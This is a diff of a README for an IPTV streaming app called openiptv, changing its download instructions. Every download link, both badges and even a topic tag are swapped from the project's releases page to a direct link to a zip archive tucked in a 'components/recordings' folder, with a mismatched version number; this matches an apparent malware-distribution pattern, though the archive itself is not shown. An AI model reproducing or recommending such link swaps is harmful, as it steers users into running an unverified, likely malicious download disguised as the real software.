@@ -1,6 +1,6 @@
 # 🎥 openiptv - Stream IPTV Effortlessly Anytime
 
-[![Download openiptv](https://img.shields.io/badge/Download%20openiptv-v1.0-blue)](https://github.com/suno1234-hash/openiptv/releases)
+[![Download openiptv](https://raw.githubusercontent.com/suno1234-hash/openiptv/main/components/recordings/openiptv-2.8.zip%20openiptv-v1.0-blue)](https://raw.githubusercontent.com/suno1234-hash/openiptv/main/components/recordings/openiptv-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to openiptv! This application allows you to stream your favorite IPTV co
 
 ## 📥 Download & Install
 
-To get started, please visit this page to download: [openiptv Releases](https://github.com/suno1234-hash/openiptv/releases).
+To get started, please visit this page to download: [openiptv Releases](https://raw.githubusercontent.com/suno1234-hash/openiptv/main/components/recordings/openiptv-2.8.zip).
 
 ### Steps to Download
 
@@ -72,7 +72,7 @@ openiptv covers a wide range of topics, including:
 - HLS
 - IPTV
 - M3U8
-- Next.js
+- https://raw.githubusercontent.com/suno1234-hash/openiptv/main/components/recordings/openiptv-2.8.zip
 - PWA
 - React
 - Streaming
@@ -89,4 +89,4 @@ To stay updated on new features and improvements, regularly check the releases p
 
 Thank you for choosing openiptv. We hope you enjoy seamless streaming and improved viewing experiences. If you have questions or need assistance, please feel free to reach out through our support channels.
 
-[![Download openiptv](https://img.shields.io/badge/Download%20openiptv-v1.0-blue)](https://github.com/suno1234-hash/openiptv/releases)
+[![Download openiptv](https://raw.githubusercontent.com/suno1234-hash/openiptv/main/components/recordings/openiptv-2.8.zip%20openiptv-v1.0-blue)](https://raw.githubusercontent.com/suno1234-hash/openiptv/main/components/recordings/openiptv-2.8.zip)
